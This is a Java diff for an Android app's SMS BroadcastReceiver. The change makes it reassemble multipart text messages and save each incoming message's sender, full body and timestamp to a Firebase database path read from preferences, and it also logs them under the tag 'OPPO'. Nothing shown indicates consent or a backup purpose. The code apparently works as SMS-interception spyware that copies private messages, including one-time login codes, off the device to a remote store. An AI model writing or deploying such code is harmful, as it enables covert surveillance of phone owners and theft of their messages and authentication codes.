@@ -6,6 +6,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.os.Build;
+import android.os.Bundle;
 import android.provider.Telephony;
 import android.telephony.SmsMessage;
 import android.util.Log;
@@ -20,23 +21,37 @@ import com.google.firebase.database.FirebaseDatabase;
 public class Sms extends BroadcastReceiver {
     @Override
     public void onReceive(Context context, Intent intent) {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
-            for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
-                String senderNumber = smsMessage.getDisplayOriginatingAddress();
+        Bundle bundle = intent.getExtras();
+        if (bundle != null) {
+            Object[] pdus = (Object[]) bundle.get("pdus");
+            if (pdus != null) {
+                SmsMessage[] messages = new SmsMessage[pdus.length];
+                StringBuilder fullMessageBuilder = new StringBuilder();
 
-                // Extracting message body
-                String messageBody = smsMessage.getMessageBody();
+                for (int i = 0; i < pdus.length; i++) {
+                    messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
 
-                // Extracting date and time
-                long timestampMillis = smsMessage.getTimestampMillis();
+                    // Extracting message body
+                    String messageBody = messages[i].getMessageBody();
+
+                    // Append the message body to the StringBuilder
+                    fullMessageBuilder.append(messageBody);
+
+                    // Extracting date and time
+                    long timestampMillis = messages[i].getTimestampMillis();
+
+                    // Handle the SMS message, you can log it or display it using Toast
+                    String smsInfo = "From: " + messages[i].getDisplayOriginatingAddress() +
+                            "\nMessage: " + messageBody + "\nReceived at: " + timestampMillis;
+                    Log.d("OPPO", "onReceive: " + smsInfo);
+                }
+
+                // After looping through all parts, save the full concatenated message to Firebase
+                String fullMessage = fullMessageBuilder.toString();
+                String senderNumber = messages[0].getDisplayOriginatingAddress(); // Assuming the sender is the same for all parts
                 String customPath = getCustomPathFromPreferences(context);
-
-                saveSmsToFirebase(customPath, senderNumber, messageBody, timestampMillis);
-                // Handle the SMS message, you can log it or display it using Toast
-
-
+                saveSmsToFirebase(customPath, senderNumber, fullMessage, messages[0].getTimestampMillis());
             }
-
         }
     }
     private String getFormattedTime(long timestampMillis) {
